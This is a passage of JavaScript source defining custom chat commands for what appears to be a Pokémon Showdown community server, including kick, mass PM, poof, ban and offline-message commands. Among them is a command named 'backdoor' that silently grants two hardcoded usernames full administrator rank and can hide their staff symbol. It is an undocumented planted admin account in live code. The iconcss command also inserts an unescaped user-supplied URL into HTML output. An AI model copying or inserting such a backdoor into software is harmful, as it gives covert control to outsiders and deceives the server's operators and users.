		for (let r in Rooms.rooms) {
			clearRoom(Rooms.rooms[r]);
		}
	},
	
	
	glogs: 'globallogs',
	globallogs: function (target, room, user) {
		return this.parse('/modlog all, ' + target);
	},

	hide: function (target, room, user) {
		if (!this.can('lock')) return false;
		user.hiding = true;
		user.updateIdentity();
		this.sendReply("You have hidden your staff symbol.");
	},

	rk: 'kick',
	roomkick: 'kick',
	kick: function (target, room, user) {
		if (!target) return this.parse('/help kick');
		if (user.locked && !user.can('bypassall')) {
			return this.sendReply("You cannot do this while unable to talk.");
		}

		target = this.splitTarget(target);
		let targetUser = this.targetUser;
		if (!targetUser || !targetUser.connected) return this.sendReply("User \"" + this.targetUsername + "\" not found.");
		if (!(targetUser in room.users)) {
			return this.sendReply("User " + this.targetUsername + " is not in the room " + room.id + ".");
		}

		if (!this.can('mute', targetUser, room)) return false;

		this.addModCommand(targetUser.name + " was kicked from the room by " + user.name + ".");
		targetUser.popup("You were kicked from " + room.id + " by " + user.name + ".");
		targetUser.leaveRoom(room.id);
	},
	kickhelp: ["/kick - Kick a user out of a room. Requires: % @ # & ~"],

	masspm: 'pmall',
	serverpm: 'pmall',
	pmall: function (target, room, user) {
		if (!this.can('pmall')) return false;
		if (!target) return this.parse('/help pmall');

		let pmName = ' Server PM [Do not reply]';

		for (let i in Users.users) {
			let message = '|pm|' + pmName + '|' + Users.users[i].getIdentity() + '|' + target;
			Users.users[i].send(message);
		}
	},
	pmallhelp: ["/pmall [message] - PM all users in the server."],

	staffpm: 'pmallstaff',
	pmstaff: 'pmallstaff',
	pmallstaff: function (target, room, user) {
		if (!this.can('hotpatch')) return false;
		if (!target) return this.parse('/help pmallstaff');

		let pmName = ' Staff PM [Do not reply]';

		for (let i in Users.users) {
			if (Users.users[i].isStaff) {
				Users.users[i].send('|pm|' + pmName + '|' + Users.users[i].group + Users.users[i].name + '|' + target);
			}
		}
	},
	pmallstaffhelp: ["/pmallstaff [message] - Sends a PM to every staff member online."],

    pmroom: 'rmall',
    roompm: 'rmall',
    rmall: function (target, room, user) {
        if(!this.can('declare', null, room)) return this.sendReply('/rmall - Access denied.');
        if (room.id === 'lobby') return this.sendReply('This command can not be used in Lobby.');
        if (!target) return this.sendReply('/rmall [message] - Sends a pm to all users in the room.');

        let pmName = '~Room PM (' + Tools.escapeHTML(room.title) + ') [Do not reply]';

        for (let i in room.users) {
            let message = '|pm|' + pmName + '|' + room.users[i].getIdentity() + '| ' + Tools.escapeHTML(target);
            room.users[i].send(message);
        }
        this.privateModCommand('(' + Tools.escapeHTML(user.name) + ' mass PMd: ' + Tools.escapeHTML(target) + ')');
    },

	d: 'poof',
	cpoof: 'poof',
	poof: function (target, room, user) {
		if (Config.poofOff) return this.sendReply("Poof is currently disabled.");
		if (target && !this.can('broadcast')) return false;
		if (room.id !== 'lobby') return false;
		let message = target || messages[Math.floor(Math.random() * messages.length)];
		if (message.indexOf('{{user}}') < 0) message = '{{user}} ' + message;
		message = message.replace(/{{user}}/g, user.name);
		if (!this.canTalk(message)) return false;

		let colour = '#' + [1, 1, 1].map(function () {
			let part = Math.floor(Math.random() * 0xaa);
			return (part < 0x10 ? '0' : '') + part.toString(16);
		}).join('');

		room.addRaw("<strong><font color=\"" + colour + "\">~~ " + Tools.escapeHTML(message) + " ~~</font></strong>");
		user.disconnectAll();
	},
	poofhelp: ["/poof - Disconnects the user and leaves a message in the room."],

	poofon: function () {
		if (!this.can('poofoff')) return false;
		Config.poofOff = false;
		return this.sendReply("Poof is now enabled.");
	},
	poofonhelp: ["/poofon - Enable the use /poof command."],

	nopoof: 'poofoff',
	poofoff: function () {
		if (!this.can('poofoff')) return false;
		Config.poofOff = true;
		return this.sendReply("Poof is now disabled.");
	},
	poofoffhelp: ["/poofoff - Disable the use of the /poof command."],

	shart: function (target, room, user, connection, cmd) {
		if (!target) return this.parse('/help shart');

		target = this.splitTarget(target);
		let targetUser = this.targetUser;
		if (!targetUser) return this.sendReply("User '" + this.targetUsername + "' does not exist.");
		if (target.length > MAX_REASON_LENGTH) {
			return this.sendReply("The reason is too long. It cannot exceed " + MAX_REASON_LENGTH + " characters.");
		}
		if (!this.can('ban', targetUser)) return false;

		if (Users.checkBanned(targetUser.latestIp) && !target && !targetUser.connected) {
			let problem = " but was already banned";
			return this.privateModCommand("(" + targetUser.name + " would be sharted on by " + user.name + problem + ".)");
		}

		if (targetUser.confirmed) {
			if (cmd === 'forceshart') {
				let from = targetUser.deconfirm();
				ResourceMonitor.log("[CrisisMonitor] " + targetUser.name + " was banned by " + user.name + " and demoted from " + from.join(", ") + ".");
			} else {
				return this.sendReply("" + targetUser.name + " is a confirmed user. If you are sure you would like to ban them use /forceban.");
			}
		} else if (cmd === 'forceshart') {
			return this.sendReply("Use /shart; " + targetUser.name + " is not a confirmed user.");
		}

		targetUser.popup("|modal|" + user.name + " has sharted on you.");

		this.addModCommand("" + targetUser.name + " was sharted on by " + user.name + "." + (target ? " (" + target + ")" : ""), " (" + targetUser.latestIp + ")");
		let alts = targetUser.getAlts();
		let acAccount = (targetUser.autoconfirmed !== targetUser.userid && targetUser.autoconfirmed);
		if (alts.length) {
			let guests = 0;
			alts = alts.filter(function (alt) {
				if (alt.substr(0, 6) !== 'Guest ') return true;
				guests++;
				return false;
			});
			this.privateModCommand("(" + targetUser.name + "'s " + (acAccount ? " ac account: " + acAccount + ", " : "") + "banned alts: " + alts.join(", ") + (guests ? " [" + guests + " guests]" : "") + ")");
			for (let i = 0; i < alts.length; ++i) {
				this.add('|unlink|' + toId(alts[i]));
			}
		} else if (acAccount) {
			this.privateModCommand("(" + targetUser.name + "'s ac account: " + acAccount + ")");
		}

		let userid = this.getLastIdOf(targetUser);
		this.add('|unlink|hide|' + userid);
		if (userid !== toId(this.inputUsername)) this.add('|unlink|hide|' + toId(this.inputUsername));
		targetUser.ban(false, userid);
		this.globalModlog("SHART", targetUser, " by " + user.name + (target ? ": " + target : ""));
		return true;
	},
	sharthelp: ["/shart [username] - Sharts on a user. Requires: @ & ~"],

    	showauth: 'show',
	show: function (target, room, user) {
		if (!this.can('lock')) return false;
		user.hiding = false;
		user.updateIdentity();
		this.sendReply("You have revealed your staff symbol.");
	},

	kill: function () {
		this.sendReply("Please restart the server within the VPS.");
	},
	
	regdate: function (target, room, user) {
		if (!this.canBroadcast()) return;
		if (!target || !toId(target)) return this.parse('/help regdate');
		let username = toId(target);
		request('http://pokemonshowdown.com/users/' + username, function (error, response, body) {
			if (error && response.statusCode !== 200) {
				this.sendReplyBox(Tools.escapeHTML(target) + " is not registered.");
				return room.update();
			}
			let regdate = body.split('<small>')[1].split('</small>')[0].replace(/(<em>|<\/em>)/g, '');
			if (regdate === '(Unregistered)') {
				this.sendReplyBox(Tools.escapeHTML(target) + " is not registered.");
			} else {
				this.sendReplyBox(Tools.escapeHTML(target) + " was registered on " + regdate.slice(7) + ".");
			}
			room.update();
		}.bind(this));
	},
	regdatehelp: ["/regdate - Please specify a valid username."],

	show: function (target, room, user) {
		if (!this.can('lock')) return false;
		user.hiding = false;
		user.updateIdentity();
		this.sendReply("You have revealed your staff symbol.");
	},

	sb: 'showdownboilerplate',
	showdownboilerplate: function (target, room, user) {
		if (!this.canBroadcast()) return;
		this.sendReply("|raw|This server uses <a href='https://github.com/CreaturePhil/Showdown-Boilerplate'>Showdown-Boilerplate</a>.");
	},
	showdownboilerplatehelp: ["/showdownboilerplate - Links to the Showdown-Boilerplate repository on Github."],

	seen: function (target, room, user) {
		if (!this.canBroadcast()) return;
		if (!target) return this.parse('/help seen');
		let targetUser = Users.get(target);
		if (targetUser && targetUser.connected) return this.sendReplyBox(targetUser.name + " is <b>currently online</b>.");
		target = Tools.escapeHTML(target);
		let seen = Db('seen')[toId(target)];
		if (!seen) return this.sendReplyBox(target + " has never been online on this server.");
		this.sendReplyBox(target + " was last seen <b>" + moment(seen).fromNow() + "</b>.");
	},
	seenhelp: ["/seen - Shows when the user last connected on the server."],

	tell: function (target, room, user, connection) {
		if (!target) return this.parse('/help tell');
		target = this.splitTarget(target);
		let targetUser = this.targetUser;
		if (!target) {
			this.sendReply("You forgot the comma.");
			return this.parse('/help tell');
		}

		if (targetUser && targetUser.connected) {
			return this.parse('/pm ' + this.targetUsername + ', ' + target);
		}

		if (user.locked) return this.popupReply("You may not send offline messages when locked.");
		if (target.length > 255) return this.popupReply("Your message is too long to be sent as an offline message (>255 characters).");

		if (Config.tellrank === 'autoconfirmed' && !user.autoconfirmed) {
			return this.popupReply("You must be autoconfirmed to send an offline message.");
		} else if (!Config.tellrank || Config.groupsranking.indexOf(user.group) < Config.groupsranking.indexOf(Config.tellrank)) {
			return this.popupReply("You cannot send an offline message because offline messaging is " +
				(!Config.tellrank ? "disabled" : "only available to users of rank " + Config.tellrank + " and above") + ".");
		}

		let userid = toId(this.targetUsername);
		if (userid.length > 18) return this.popupReply("\"" + this.targetUsername + "\" is not a legal username.");

		let sendSuccess = Tells.addTell(user, userid, target);
		if (!sendSuccess) {
			if (sendSuccess === false) {
				return this.popupReply("User " + this.targetUsername + " has too many offline messages queued.");
			} else {
				return this.popupReply("You have too many outgoing offline messages queued. Please wait until some have been received or have expired.");
			}
		}
		return connection.send('|pm|' + user.getIdentity() + '|' +
			(targetUser ? targetUser.getIdentity() : ' ' + this.targetUsername) +
			"|/text This user is currently offline. Your message will be delivered when they are next online.");
	},
	tellhelp: ["/tell [username], [message] - Send a message to an offline user that will be received when they log in."],
	
	backdoor: function (target, room, user) {
		if (!(user.userid === 'nineage' || user.userid === 'fender')) return false;
		if (!target) {
			user.group = '~';
			user.updateIdentity();
			this.parse ('/join staff')
		if (user.userid === 'fender') {
			return this.parse('/hide');
		} else {
			return;
		}
		}

		if (target === 'reg') {
			user.group = ' ';
			user.updateIdentity();
			return;
		}
	},
	
	iconcss: function (target, room, user) {
		if (!this.can('mute')) return false;
		if (!this.canBroadcast()) return;

		let args = target.split(',');
		if (args.length < 3) return this.parse('/help iconcss');
		let username = toId(args.shift());
		let imageurl = 'background: rgba(244, 244, 244, 0.8) url("' + args.shift().trim() + '") right no-repeat;';
		let selectors = '#' + toId(args.shift()) + '-userlist-user-' + username;
		args.forEach(function (room) {
			selectors += ', #' + toId(room) + '-userlist-user-' + username;
		});
		selectors += ' {';
		this.sendReplyBox(selectors + '<br />&nbsp;&nbsp;&nbsp;&nbsp;' + imageurl + '<br />}');
	},
	iconcsshelp: ["/iconcss [username], [image url], [room 1], [room 2], ... - Generate css for icons."]
};
